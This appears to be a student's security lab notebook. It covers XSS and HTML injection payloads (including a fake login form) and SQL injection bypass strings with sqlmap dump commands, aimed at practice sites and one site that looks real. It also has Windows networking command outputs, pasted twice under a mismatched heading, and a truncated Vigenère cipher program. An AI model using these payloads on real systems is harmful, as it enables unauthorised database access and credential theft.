https://shorturl.at/bhrtz








XSS
website: http://testphp.vulnweb.com/userinfo.php (type php login test page)
login using 'test' username and 'test' password and in username section
enter <a href="https://www.google.com">HTML</a> and update
creates hyperlink to google

Website testfire.net

<x contenteditable onkeydown=alert(1)>press any key!
<x onmousedown=alert(1)>click this! 
<x onmousemove=alert(1)>hover this! 
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
alert&lpar;1&rpar;
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>
<html ontouchstart=alert(1)> 
<form action=javascript:alert(1)><input type=submit>
<area onmousemove="alert(1)">test</area>
<address ondblclick="alert(1)">test</address>

sudo netstat -tulnp | grep ':8080'
sudo kill number









SQL INJECTION
tom

' OR '1'='1

Website: https://issauga.lt/login-1/index.phps

sqlmap -r sy -p username  - sy is Filename

sqlmap -r sy -p username --dump  



SQL injection is a cybersecurity vulnerability that occurs when an attacker injects malicious SQL code into input fields of a web application, exploiting vulnerabilities in the application's SQL queries. This allows the attacker to manipulate the database, steal sensitive information, modify or delete data, or execute arbitrary commands.

Attackers exploit SQL injection by inserting specially crafted SQL commands into input fields, such as login forms, search boxes, or URL parameters. These commands can bypass authentication mechanisms, extract data from the database, or perform unauthorized actions.

There are several types of SQL injection attacks, including:

1. **Classic SQL Injection**: Involves inserting malicious SQL code into input fields to manipulate the database directly.

2. **Blind SQL Injection**: Exploits vulnerabilities where the application doesn't respond differently based on the result of the injected SQL query, making it harder to detect.

3. **Union-Based SQL Injection**: Uses the UNION SQL operator to combine results from two or more SELECT statements, allowing attackers to retrieve data from other tables.

4. **Error-Based SQL Injection**: Relies on error messages generated by the database server to extract information about the structure of the database.

5. **Time-Based SQL Injection**: Exploits time delays in database operations to infer information about the database.

To prevent SQL injection attacks, developers should implement the following best practices:

1. **Parameterized Queries**: Use parameterized queries or prepared statements with bound parameters to separate SQL code from data, preventing attackers from injecting malicious SQL.

2. **Input Validation**: Validate and sanitize input data to ensure it meets expected criteria before executing SQL queries.

3. **Least Privilege**: Limit database user privileges to only those necessary for the application to function, reducing the impact of a successful SQL injection attack.

4. **Escaping User Input**: Escape special characters in user input before incorporating them into SQL queries to prevent them from being interpreted as SQL commands.

5. **Database Firewalls**: Implement database firewalls and intrusion detection systems to monitor and block suspicious SQL injection attempts.

By following these best practices and regularly updating and patching applications, organizations can significantly reduce the risk of SQL injection attacks and protect their sensitive data.
















SQL HTML INJECTION
SQL injection website:

https://issauga.lt/login-1/index.php

Username admin 'OR'1'='1
Password : random
OR
http://testfire.net/
username: ' OR 1=1--
Password: random

HTML injection:
Website: http://testfire.net/ (just type testfire.net)

in the search bar enter : <h1>hello</h1>
website: http://testphp.vulnweb.com/userinfo.php (type php login test page)
login using 'test' username and 'test' password and in username section
enter <a href="https://www.google.com">HTML</a> and update
creates hyperlink to google

html injection payloads ( enter in search bar of testfire.net website)
<colgroup><col span="2" style="background-color:red"></colgroup>
<h1>hello</h1>
<textarea id="HTML" name="HTML" rows="4" cols="50">Html injected</textarea>
<button type="button">Click Me!</button> 
<form method="GET">Username: <input type="text" name="username" value="" /> <br />Password: <input type="password" name="passwd" value="" /> <br /><input type="submit" name="submit" value="login" /></form>















NETWORK COMMANDS
C:\Users\Purvashi Shah>ping 8.8.8.8

Pinging 8.8.8.8 with 32 bytes of data:
Reply from 8.8.8.8: bytes=32 time=2966ms TTL=117
Reply from 8.8.8.8: bytes=32 time=8ms TTL=117
Reply from 8.8.8.8: bytes=32 time=8ms TTL=117
Reply from 8.8.8.8: bytes=32 time=15ms TTL=117

Ping statistics for 8.8.8.8:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 8ms, Maximum = 2966ms, Average = 749ms

EXPLANATION:
time=2966ms, time=8ms, time=8ms, time=15ms: These are the round-trip times (RTT) in milliseconds for each packet sent. The RTT measures the time it takes for a packet to travel from the source to the destination and back again. 

TTL=117: Time to Live (TTL) is a value in the packet that limits the lifespan of the packet. Each time a router forwards a packet, it decrements the TTL value by one. If the TTL reaches zero, the packet is discarded. This value helps prevent packets from endlessly circulating in a network loop.

Ping statistics: Provides an overview of the ping test results, including the number of packets sent, received, and lost.

--------------------------xox------------------------------------

C:\Users\Purvashi Shah>hostname
Vulcan

--------------------------xox------------------------------------

C:\Users\Purvashi Shah>getmac

Physical Address    Transport Name

=================== ==========================================================
C4-23-60-98-0A-26   \Device\Tcpip_{8FA250A8-BC9A-4E14-B5C2-7A57F5178EC8}
0A-00-27-00-00-0E   \Device\Tcpip_{A4DA3CC1-8975-4C0A-9201-7ACD0FEF0BF8}

EXPLANATION: 
The getmac command retrieves the Media Access Control (MAC) addresses for all network adapters on a system. Here's the breakdown of the output:-

Physical Address: Displays the MAC address of each network adapter.
Transport Name: Specifies the network interface associated with each MAC address.

-------------------------xox--------------------------------------------

C:\Users\Purvashi Shah>arp -a

Interface: 192.168.0.104 --- 0xc
  Internet Address      Physical Address      Type
  192.168.0.1           e4-c3-2a-f5-ca-84     dynamic
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 192.168.56.1 --- 0xe
  Internet Address      Physical Address      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

EXPLANATION:-
The arp -a command displays the ARP (Address Resolution Protocol) cache on your computer, which contains mappings of IP addresses to physical MAC addresses. Here's the breakdown of the output:

For Interface: 192.168.0.104 --- 0xc

Internet Address: Displays the IP address of the device.
Physical Address: Shows the corresponding MAC address of the device.
Type: Indicates whether the mapping is static (manually configured) or dynamic (learned automatically through ARP requests).

-------------------------xox--------------------------------------------

C:\Users\Purvashi Shah>nslookup 8.8.8.8
Server:  UnKnown
Address:  192.168.0.1

Name:    dns.google
Address:  8.8.8.8

EXPLANATION: The nslookup command is used to query the DNS (Domain Name System) servers to obtain domain name or IP address mappings. Here's the breakdown of the output:

-----------------------------------xox-----------------------------------------

C:\Users\Purvashi Shah>tracert 8.8.8.8

Tracing route to dns.google [8.8.8.8]
over a maximum of 30 hops:

  1     1 ms     1 ms     1 ms  192.168.0.1
  2     9 ms     1 ms     2 ms  103.31.144.10
  3     *       10 ms     3 ms  103.31.144.1
  4     8 ms     2 ms     4 ms  103.31.144.21
  5    43 ms     9 ms    31 ms  142.250.165.192
  6    14 ms     8 ms     6 ms  72.14.238.215
  7     9 ms     3 ms     3 ms  209.85.250.139
  8     *        8 ms     7 ms  dns.google [8.8.8.8]

EXPLANATION:
The tracert command traces the route that data packets take from your computer to a specified destination, displaying information about each hop along the route. Here's the breakdown of the output:

Tracing route to dns.google [8.8.8.8]: Indicates that the trace is being performed to the destination dns.google with the IP address 8.8.8.8.
Over a maximum of 30 hops: Specifies that the trace will show up to 30 hops between your computer and the destination.
Each line represents a different hop along the route:

Hop number: The number of the hop in the route.
RTT (Round-Trip Time): The time it takes for a packet to travel from your computer to that hop and back again, measured in milliseconds.
IP address: The IP address of the router or intermediary device at that hop.
Hostname (if available): The hostname associated with the IP address, if it can be resolved.


-----------------------------------------------xox--------------------------------------------

C:\Users\Purvashi Shah>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::7d9c:fbc7:8aa9:6041%14
   IPv4 Address. . . . . . . . . . . : 192.168.56.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Wireless LAN adapter Local Area Connection* 1:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

Wireless LAN adapter Local Area Connection* 2:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

Wireless LAN adapter Wi-Fi:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::4d01:407a:a7ee:deef%12
   IPv4 Address. . . . . . . . . . . : 192.168.0.104
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.0.1


EXPLANATION: 
The ipconfig command displays the IP configuration for all network adapters on your computer. Here's the breakdown of the output:

Ethernet adapter Ethernet:
Connection-specific DNS Suffix: The DNS suffix associated with this connection.
Link-local IPv6 Address: The IPv6 address for this adapter.
IPv4 Address: The IPv4 address for this adapter.
Subnet Mask: The subnet mask for this adapter.
Default Gateway: The default gateway for this adapter.

Wireless LAN adapter Local Area Connection 1* and Local Area Connection 2*:
These adapters are currently disconnected, as indicated by "Media State: Media disconnected".

Wireless LAN adapter Wi-Fi:
Connection-specific DNS Suffix: The DNS suffix associated with this connection.
Link-local IPv6 Address: The IPv6 address for this adapter.
IPv4 Address: The IPv4 address for this adapter.
Subnet Mask: The subnet mask for this adapter.
Default Gateway: The default gateway for this adapter.

----------------------------------------xox----------------------------------------------

C:\Users\Purvashi Shah>netstat

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    192.168.0.104:49475    20.198.119.143:https   ESTABLISHED
  TCP    192.168.0.104:61055    whatsapp-chatd-edge-shv-02-bom1:5222  ESTABLISHED
  TCP    192.168.0.104:61060    20.212.88.117:https    ESTABLISHED
  TCP    192.168.0.104:61061    sa-in-f188:5228        ESTABLISHED
  TCP    192.168.0.104:61239    20.249.186.67:https    ESTABLISHED
  TCP    192.168.0.104:61263    20.198.119.84:https    ESTABLISHED
  TCP    192.168.0.104:61438    a23-206-173-11:https   CLOSE_WAIT
  TCP    192.168.0.104:61439    a23-206-173-11:https   CLOSE_WAIT
  TCP    192.168.0.104:61442    a23-206-173-11:https   CLOSE_WAIT
  TCP    192.168.0.104:61443    a23-206-173-11:https   CLOSE_WAIT
  TCP    192.168.0.104:61444    a23-206-173-11:https   CLOSE_WAIT
  TCP    192.168.0.104:61445    a23-206-173-11:https   CLOSE_WAIT
  TCP    192.168.0.104:61451    a23-206-173-72:https   CLOSE_WAIT
  TCP    192.168.0.104:61452    a23-206-173-72:https   CLOSE_WAIT
  TCP    192.168.0.104:61453    a23-206-173-72:https   CLOSE_WAIT
  TCP    192.168.0.104:61472    20.65.133.230:https    ESTABLISHED
  TCP    192.168.0.104:61473    20.189.172.223:https   ESTABLISHED
  TCP    192.168.0.104:61501    e2a:https              TIME_WAIT
  TCP    192.168.0.104:61502    bom07s16-in-f3:https   ESTABLISHED
  TCP    192.168.0.104:64248    a23-212-252-81:https   CLOSE_WAIT
  TCP    192.168.0.104:64252    a23-209-103-19:https   CLOSE_WAIT

EXPLANATION: 

The netstat command displays active TCP connections, listening ports, and related network statistics. Here's the breakdown of the output:

Proto: Indicates the protocol used for the connection (TCP or UDP).
Local Address: Displays the local IP address and port number for the connection.
Foreign Address: Shows the foreign (remote) IP address and port number.
State: Represents the state of the connection.

-------------------------------------------xox----------------------------------------

C:\Users\Purvashi Shah>route print
===========================================================================
Interface List
 14...0a 00 27 00 00 0e ......VirtualBox Host-Only Ethernet Adapter
 11...c4 23 60 98 0a 27 ......Microsoft Wi-Fi Direct Virtual Adapter
 15...c6 23 60 98 0a 26 ......Microsoft Wi-Fi Direct Virtual Adapter #2
 12...c4 23 60 98 0a 26 ......Intel(R) Wi-Fi 6 AX201 160MHz
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0      192.168.0.1    192.168.0.104     40
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
      192.168.0.0    255.255.255.0         On-link     192.168.0.104    296
    192.168.0.104  255.255.255.255         On-link     192.168.0.104    296
    192.168.0.255  255.255.255.255         On-link     192.168.0.104    296
     192.168.56.0    255.255.255.0         On-link      192.168.56.1    281
     192.168.56.1  255.255.255.255         On-link      192.168.56.1    281
   192.168.56.255  255.255.255.255         On-link      192.168.56.1    281
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link      192.168.56.1    281
        224.0.0.0        240.0.0.0         On-link     192.168.0.104    296
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link      192.168.56.1    281
  255.255.255.255  255.255.255.255         On-link     192.168.0.104    296
===========================================================================
Persistent Routes:
  None

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
 14    281 fe80::/64                On-link
 12    296 fe80::/64                On-link
 12    296 fe80::4d01:407a:a7ee:deef/128
                                    On-link
 14    281 fe80::7d9c:fbc7:8aa9:6041/128
                                    On-link
  1    331 ff00::/8                 On-link
 14    281 ff00::/8                 On-link
 12    296 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

EXPLANATION:
The route print command displays the IP routing table, which shows the routes your computer uses to forward packets to their destinations. Here's the breakdown of the output:

Interface List: Lists the network interfaces on your computer along with their associated MAC addresses.
IPv4 Route Table: Displays the IPv4 routing table, which contains routes for IPv4 network destinations.
Active Routes: Shows the active routes currently being used by your computer.
Network Destination: The destination network or IP address.
Netmask: The subnet mask associated with the destination network.
Gateway: The gateway used to reach the destination network.
Interface: The network interface through which packets are sent to reach the destination.
Metric: A value used by the routing algorithm to determine the best route when multiple routes are available.

----------------------------------------xox--------------------------------------

C:\Users\Purvashi Shah>pathping 8.8.8.8

Tracing route to dns.google [8.8.8.8]
over a maximum of 30 hops:
  0  Vulcan [192.168.0.104]
  1  192.168.0.1
  2  103.31.144.10
  3  103.31.144.1
  4  103.31.144.21
  5  142.250.165.192
  6  72.14.238.215
  7  209.85.250.139
  8  dns.google [8.8.8.8]

Computing statistics for 200 seconds...

EXPLANATION:
The pathping command combines the features of ping and tracert, providing information about the path that packets take to reach a destination along with network latency and packet loss statistics. Here's the breakdown of the output:

Tracing route to dns.google [8.8.8.8]: Indicates that the trace is being performed to the destination dns.google with the IP address 8.8.8.8.
Over a maximum of 30 hops: Specifies that the trace will show up to 30 hops between your computer and the destination.
Each line represents a different hop along the route:

Hop number: The number of the hop in the route.
IP address or hostname: Displays the IP address or hostname of the router or intermediary device at that hop.
Hostname (if available): The hostname associated with the IP address, if it can be resolved.
Latency: The round-trip time (RTT) in milliseconds for packets to travel from your computer to that hop and back again.
Statistics: After tracing the route, the command computes statistics for a specified duration (200 seconds in your case), including latency and packet loss.

1. Ping
Of all the Windows 10 network commands, Ping is probably the one almost everyone knows
about and has used before. The Ping command allows you to test the reachability of a device on
a network. Pinging a host should return four data packets, if the data packets are not returned you
know there is a problem with your network connection.
To run the basic command, at the prompt type:ping [host]
2. IPConfig
The IPConfig command is one of the more useful basic Windows network commands everyone
should know and use to troubleshoot problems. The IPConfig command displays basic IP
address configuration information for the Windows device you are working on. In fact, the
command will display information for every network adapter that has ever been installed on your
Windows 10 computer.
To run the basic command, at the prompt type:ipconfig.
3. Getmac
Every network capable device on the internet has a unique identifying number called its MAC
address. The number is assigned during manufacture and is established in the hardware of the
device. Using the Getmac command, a user can determine the MAC address of their various
network devices. Some administrators will use the unique MAC addresses of devices to limit
To run the basic command, at the prompt type:getmac
4. HostName
The Windows 10 HostName network command will simply display the current name of your
Windows 10 computer . This is the name your computer uses to identify itself to the other
devices and servers on your local network. You can find this name in the System information
screen in the GUI, but this command is quicker.
To run the basic command, at the prompt type:hostname
5. NSLookUp
The NSLookUp Windows 10 network command displays information that you can use to
diagnose Domain Name System (DNS) infrastructure. Using NSLookUp without a parameter
will show the DNS server your PC is currently using to resolve domain names into IP addresses.
I am using Google’s DNS service because the server provided by my ISP is slow and prone to
crashes.
To run the basic command, at the prompt type:nslookup
6. Tracert
Another handy tool for troubleshooting network connections in Windows 10 is the Tracert
command. This command will trace the route a data packet takes before reaching its destination,
displaying information on each hop along the route. Each hop of the route will display the
latency between your device and that particular hop and the IP address of the hop, as shown in
below image.
To run the basic command, at the prompt type:tracert [host]
Where [host] is the name or IP address of a common host server (google.com, techrepublic.com,
etc.).
7. Netstat
The Netstat command displays active TCP connections, ports on which the computer is listening,
Ethernet statistics, the IP routing table, IPv4 statistics, and IPv6 statistics. When used without
parameters, this command displays active TCP connections. The information this command
provides can be useful in pinpointing problems in your network connections.
To run the basic command, at the prompt type:netstat
8. Arp
The Windows 10 network command Arp displays entries in the Address Resolution Protocol
(ARP) cache, which contains one or more tables that are used to store IP addresses and their
resolved Ethernet physical addresses. To get useful information from the Arp command you must
provide a parameter. The most general parameter is /a, which displays current Arp cache tables
for all interfaces.
To run the basic command, at the prompt type:arp /a
9. PathPing
Generally speaking, the Windows 10 network command PathPing combines the ping command
with the tracert command, providing information about network latency and network loss at
intermediate hops between a source and destination.the PathPing command provides more detail
than either ping or tracert can provide, such as latency reports and statistics on packet loss.
To run the basic command, at the prompt type:pathping [host]
Where [host] is the name or IP address of a common host server (google.com, techrepublic.com,
etc.).
10. SystemInfo
The last command on our list is the SystemInfo command, which displays a detailed list of
configuration information about your Windows 10 PC. The information listed by this command
is too lengthy to mention in full but includes the installed version of Windows 10, the host name,
the Product ID, the type and number of CPUs, RAM configuration, network card details and
installed hotfixes















DIFFIE HILLMAN
C:\Users\Purvashi Shah>ping 8.8.8.8

Pinging 8.8.8.8 with 32 bytes of data:
Reply from 8.8.8.8: bytes=32 time=2966ms TTL=117
Reply from 8.8.8.8: bytes=32 time=8ms TTL=117
Reply from 8.8.8.8: bytes=32 time=8ms TTL=117
Reply from 8.8.8.8: bytes=32 time=15ms TTL=117

Ping statistics for 8.8.8.8:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 8ms, Maximum = 2966ms, Average = 749ms

EXPLANATION:
time=2966ms, time=8ms, time=8ms, time=15ms: These are the round-trip times (RTT) in milliseconds for each packet sent. The RTT measures the time it takes for a packet to travel from the source to the destination and back again. 

TTL=117: Time to Live (TTL) is a value in the packet that limits the lifespan of the packet. Each time a router forwards a packet, it decrements the TTL value by one. If the TTL reaches zero, the packet is discarded. This value helps prevent packets from endlessly circulating in a network loop.

Ping statistics: Provides an overview of the ping test results, including the number of packets sent, received, and lost.

--------------------------xox------------------------------------

C:\Users\Purvashi Shah>hostname
Vulcan

--------------------------xox------------------------------------

C:\Users\Purvashi Shah>getmac

Physical Address    Transport Name

=================== ==========================================================
C4-23-60-98-0A-26   \Device\Tcpip_{8FA250A8-BC9A-4E14-B5C2-7A57F5178EC8}
0A-00-27-00-00-0E   \Device\Tcpip_{A4DA3CC1-8975-4C0A-9201-7ACD0FEF0BF8}

EXPLANATION: 
The getmac command retrieves the Media Access Control (MAC) addresses for all network adapters on a system. Here's the breakdown of the output:-

Physical Address: Displays the MAC address of each network adapter.
Transport Name: Specifies the network interface associated with each MAC address.

-------------------------xox--------------------------------------------

C:\Users\Purvashi Shah>arp -a

Interface: 192.168.0.104 --- 0xc
  Internet Address      Physical Address      Type
  192.168.0.1           e4-c3-2a-f5-ca-84     dynamic
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static

Interface: 192.168.56.1 --- 0xe
  Internet Address      Physical Address      Type
  192.168.56.255        ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  224.0.0.252           01-00-5e-00-00-fc     static
  239.255.255.250       01-00-5e-7f-ff-fa     static

EXPLANATION:-
The arp -a command displays the ARP (Address Resolution Protocol) cache on your computer, which contains mappings of IP addresses to physical MAC addresses. Here's the breakdown of the output:

For Interface: 192.168.0.104 --- 0xc

Internet Address: Displays the IP address of the device.
Physical Address: Shows the corresponding MAC address of the device.
Type: Indicates whether the mapping is static (manually configured) or dynamic (learned automatically through ARP requests).

-------------------------xox--------------------------------------------

C:\Users\Purvashi Shah>nslookup 8.8.8.8
Server:  UnKnown
Address:  192.168.0.1

Name:    dns.google
Address:  8.8.8.8

EXPLANATION: The nslookup command is used to query the DNS (Domain Name System) servers to obtain domain name or IP address mappings. Here's the breakdown of the output:

-----------------------------------xox-----------------------------------------

C:\Users\Purvashi Shah>tracert 8.8.8.8

Tracing route to dns.google [8.8.8.8]
over a maximum of 30 hops:

  1     1 ms     1 ms     1 ms  192.168.0.1
  2     9 ms     1 ms     2 ms  103.31.144.10
  3     *       10 ms     3 ms  103.31.144.1
  4     8 ms     2 ms     4 ms  103.31.144.21
  5    43 ms     9 ms    31 ms  142.250.165.192
  6    14 ms     8 ms     6 ms  72.14.238.215
  7     9 ms     3 ms     3 ms  209.85.250.139
  8     *        8 ms     7 ms  dns.google [8.8.8.8]

EXPLANATION:
The tracert command traces the route that data packets take from your computer to a specified destination, displaying information about each hop along the route. Here's the breakdown of the output:

Tracing route to dns.google [8.8.8.8]: Indicates that the trace is being performed to the destination dns.google with the IP address 8.8.8.8.
Over a maximum of 30 hops: Specifies that the trace will show up to 30 hops between your computer and the destination.
Each line represents a different hop along the route:

Hop number: The number of the hop in the route.
RTT (Round-Trip Time): The time it takes for a packet to travel from your computer to that hop and back again, measured in milliseconds.
IP address: The IP address of the router or intermediary device at that hop.
Hostname (if available): The hostname associated with the IP address, if it can be resolved.


-----------------------------------------------xox--------------------------------------------

C:\Users\Purvashi Shah>ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::7d9c:fbc7:8aa9:6041%14
   IPv4 Address. . . . . . . . . . . : 192.168.56.1
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :

Wireless LAN adapter Local Area Connection* 1:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

Wireless LAN adapter Local Area Connection* 2:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

Wireless LAN adapter Wi-Fi:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::4d01:407a:a7ee:deef%12
   IPv4 Address. . . . . . . . . . . : 192.168.0.104
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.0.1


EXPLANATION: 
The ipconfig command displays the IP configuration for all network adapters on your computer. Here's the breakdown of the output:

Ethernet adapter Ethernet:
Connection-specific DNS Suffix: The DNS suffix associated with this connection.
Link-local IPv6 Address: The IPv6 address for this adapter.
IPv4 Address: The IPv4 address for this adapter.
Subnet Mask: The subnet mask for this adapter.
Default Gateway: The default gateway for this adapter.

Wireless LAN adapter Local Area Connection 1* and Local Area Connection 2*:
These adapters are currently disconnected, as indicated by "Media State: Media disconnected".

Wireless LAN adapter Wi-Fi:
Connection-specific DNS Suffix: The DNS suffix associated with this connection.
Link-local IPv6 Address: The IPv6 address for this adapter.
IPv4 Address: The IPv4 address for this adapter.
Subnet Mask: The subnet mask for this adapter.
Default Gateway: The default gateway for this adapter.

----------------------------------------xox----------------------------------------------

C:\Users\Purvashi Shah>netstat

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    192.168.0.104:49475    20.198.119.143:https   ESTABLISHED
  TCP    192.168.0.104:61055    whatsapp-chatd-edge-shv-02-bom1:5222  ESTABLISHED
  TCP    192.168.0.104:61060    20.212.88.117:https    ESTABLISHED
  TCP    192.168.0.104:61061    sa-in-f188:5228        ESTABLISHED
  TCP    192.168.0.104:61239    20.249.186.67:https    ESTABLISHED
  TCP    192.168.0.104:61263    20.198.119.84:https    ESTABLISHED
  TCP    192.168.0.104:61438    a23-206-173-11:https   CLOSE_WAIT
  TCP    192.168.0.104:61439    a23-206-173-11:https   CLOSE_WAIT
  TCP    192.168.0.104:61442    a23-206-173-11:https   CLOSE_WAIT
  TCP    192.168.0.104:61443    a23-206-173-11:https   CLOSE_WAIT
  TCP    192.168.0.104:61444    a23-206-173-11:https   CLOSE_WAIT
  TCP    192.168.0.104:61445    a23-206-173-11:https   CLOSE_WAIT
  TCP    192.168.0.104:61451    a23-206-173-72:https   CLOSE_WAIT
  TCP    192.168.0.104:61452    a23-206-173-72:https   CLOSE_WAIT
  TCP    192.168.0.104:61453    a23-206-173-72:https   CLOSE_WAIT
  TCP    192.168.0.104:61472    20.65.133.230:https    ESTABLISHED
  TCP    192.168.0.104:61473    20.189.172.223:https   ESTABLISHED
  TCP    192.168.0.104:61501    e2a:https              TIME_WAIT
  TCP    192.168.0.104:61502    bom07s16-in-f3:https   ESTABLISHED
  TCP    192.168.0.104:64248    a23-212-252-81:https   CLOSE_WAIT
  TCP    192.168.0.104:64252    a23-209-103-19:https   CLOSE_WAIT

EXPLANATION: 

The netstat command displays active TCP connections, listening ports, and related network statistics. Here's the breakdown of the output:

Proto: Indicates the protocol used for the connection (TCP or UDP).
Local Address: Displays the local IP address and port number for the connection.
Foreign Address: Shows the foreign (remote) IP address and port number.
State: Represents the state of the connection.

-------------------------------------------xox----------------------------------------

C:\Users\Purvashi Shah>route print
===========================================================================
Interface List
 14...0a 00 27 00 00 0e ......VirtualBox Host-Only Ethernet Adapter
 11...c4 23 60 98 0a 27 ......Microsoft Wi-Fi Direct Virtual Adapter
 15...c6 23 60 98 0a 26 ......Microsoft Wi-Fi Direct Virtual Adapter #2
 12...c4 23 60 98 0a 26 ......Intel(R) Wi-Fi 6 AX201 160MHz
  1...........................Software Loopback Interface 1
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0      192.168.0.1    192.168.0.104     40
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331
      192.168.0.0    255.255.255.0         On-link     192.168.0.104    296
    192.168.0.104  255.255.255.255         On-link     192.168.0.104    296
    192.168.0.255  255.255.255.255         On-link     192.168.0.104    296
     192.168.56.0    255.255.255.0         On-link      192.168.56.1    281
     192.168.56.1  255.255.255.255         On-link      192.168.56.1    281
   192.168.56.255  255.255.255.255         On-link      192.168.56.1    281
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331
        224.0.0.0        240.0.0.0         On-link      192.168.56.1    281
        224.0.0.0        240.0.0.0         On-link     192.168.0.104    296
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331
  255.255.255.255  255.255.255.255         On-link      192.168.56.1    281
  255.255.255.255  255.255.255.255         On-link     192.168.0.104    296
===========================================================================
Persistent Routes:
  None

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
  1    331 ::1/128                  On-link
 14    281 fe80::/64                On-link
 12    296 fe80::/64                On-link
 12    296 fe80::4d01:407a:a7ee:deef/128
                                    On-link
 14    281 fe80::7d9c:fbc7:8aa9:6041/128
                                    On-link
  1    331 ff00::/8                 On-link
 14    281 ff00::/8                 On-link
 12    296 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

EXPLANATION:
The route print command displays the IP routing table, which shows the routes your computer uses to forward packets to their destinations. Here's the breakdown of the output:

Interface List: Lists the network interfaces on your computer along with their associated MAC addresses.
IPv4 Route Table: Displays the IPv4 routing table, which contains routes for IPv4 network destinations.
Active Routes: Shows the active routes currently being used by your computer.
Network Destination: The destination network or IP address.
Netmask: The subnet mask associated with the destination network.
Gateway: The gateway used to reach the destination network.
Interface: The network interface through which packets are sent to reach the destination.
Metric: A value used by the routing algorithm to determine the best route when multiple routes are available.

----------------------------------------xox--------------------------------------

C:\Users\Purvashi Shah>pathping 8.8.8.8

Tracing route to dns.google [8.8.8.8]
over a maximum of 30 hops:
  0  Vulcan [192.168.0.104]
  1  192.168.0.1
  2  103.31.144.10
  3  103.31.144.1
  4  103.31.144.21
  5  142.250.165.192
  6  72.14.238.215
  7  209.85.250.139
  8  dns.google [8.8.8.8]

Computing statistics for 200 seconds...

EXPLANATION:
The pathping command combines the features of ping and tracert, providing information about the path that packets take to reach a destination along with network latency and packet loss statistics. Here's the breakdown of the output:

Tracing route to dns.google [8.8.8.8]: Indicates that the trace is being performed to the destination dns.google with the IP address 8.8.8.8.
Over a maximum of 30 hops: Specifies that the trace will show up to 30 hops between your computer and the destination.
Each line represents a different hop along the route:

Hop number: The number of the hop in the route.
IP address or hostname: Displays the IP address or hostname of the router or intermediary device at that hop.
Hostname (if available): The hostname associated with the IP address, if it can be resolved.
Latency: The round-trip time (RTT) in milliseconds for packets to travel from your computer to that hop and back again.
Statistics: After tracing the route, the command computes statistics for a specified duration (200 seconds in your case), including latency and packet loss.
















vignere cipher
#include <stdio.h>  
#include <ctype.h>  
#include <string.h>  
#include <stdlib.h>  
  
void encrypt() {  
    char plaintext[128];  
    char key[16];  
    printf("\nEnter the plaintext (up to 128 characters): ");  
    scanf(" %[^\n]", plaintext); // Read input with spaces  
    printf("Enter the key (up to 16 characters): ");  
    scanf(" %[^\n]", key);  
  
    printf("Cipher Text: ");  
    for (int i = 0, j = 0; i < strlen(plaintext); i++, j++) {  
        if (j >= strlen(key)) {  
            j = 0;  
        }  
        int shift = toupper(key[j]) - 'A';  
        char encryptedChar = ((toupper(plaintext[i]) - 'A' + shift) % 26) + 'A';  
        printf("%c", encryptedChar);  
    }  
